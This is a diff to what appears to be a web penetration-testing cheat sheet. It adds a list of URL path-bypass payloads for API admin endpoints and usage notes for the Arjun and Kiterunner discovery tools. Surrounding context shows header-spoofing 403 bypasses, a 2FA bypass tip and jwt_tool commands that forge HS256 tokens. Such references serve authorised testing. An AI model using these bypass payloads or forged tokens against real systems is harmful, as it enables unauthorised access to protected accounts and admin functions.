@@ -6,6 +6,8 @@
 
 - [2FA Bypass Techniques](#2fa-bypass-techniques)
 - [403 Bypass](#403-bypass)
+- [Application Programming Interface (API)](#application-programming-interface-api)
+- [Arjun](#arjun)
 - [Asset Discovery](#asset-discovery)
 - [Burp Suite](#burp-suite)
 - [Bypassing File Upload Restrictions](#bypassing-file-upload-restrictions)
@@ -44,6 +46,7 @@
 - [Jenkins](#jenkins)
 - [jsleak](#jsleak)
 - [JWT_Tool](#jwt_tool)
+- [Kiterunner](#kiterunner)
 - [kxss](#kxss)
 - [Kyubi](#kyubi)
 - [Leaky Paths](#leaky-paths)
@@ -237,6 +240,57 @@ Enter the code `000000` or `null` to bypass 2FA protection.
 $ curl -I http://<RHOST> -H "X-Client-IP: 127.0.0.1"
 $ curl -I http://<RHOST> -H "X-CLIENT-IP: 127.0.0.1"
 $ curl -I http://<RHOST> -H "X-Client-Ip: 127.0.0.1"
+```
+
+## Application Programming Interface (API)
+
+### Bypass List
+
+> https://<RHOST>/admin/password/edit
+
+```c
+?
+??
+&
+3
+#
+%
+/
+/.. ;/
+../
+.. /
+..%2f
+\..\.\
+.././
+%20
+%09
+%00
+%3f
+%26
+%23
+..%00/
+..%0d/
+..%5c
+..%ff/
+%2e%2e%2f
+.%2e/
+;.json
+.json
+```
+
+## Arjun
+
+```c
+https://github.com/s0md3v/Arjun
+```
+
+```c
+$ pipx install arjun
+```
+
+```c
+$ arjun -u <RHOST>
+$ arjun -u <RHOST> -m <METHOD>
 ```
 
 ## Asset Discovery
@@ -1267,6 +1321,16 @@ $ cat <FILE>.txt | jsleak -l -s -c 30        // Read from File
 ```c
 $ python3 jwt_tool.py -b -S hs256 -p 'secretlhfIH&FY*#oysuflkhskjfhefesf' $(echo -n '{"alg":"HS256","typ":"JWT"}' | base64).$(echo -n '{"name": "1", "exp":' `date -d "+7 days" +%s`} | base64 -w0).
 $ python3 jwt_tool.py -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE' eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTgyOWVmOTYzOTMwYjA0NzYzZmU2YzMiLCJuYW1lIjoiZm9vYmFyIiwiZW1haWwiOiJmb29iYXJAc2VjcmV0LmNvbSIsImlhdCI6MTYzNTk1MDQxOX0.nhsLKCvNPBU8EoYVwDDpo8wGrL9VV62vrHVxfsBPCRk
+```
+
+## Kiterunner
+
+> https://github.com/assetnote/kiterunner
+
+```c
+$ kr wordlist list
+$ kr scan http://<RHOST> -A <WORDLIST>
+$ kr scan http://<RHOST> -A <WORDLIST> --ignore-length 24
 ```
 
 ## kxss
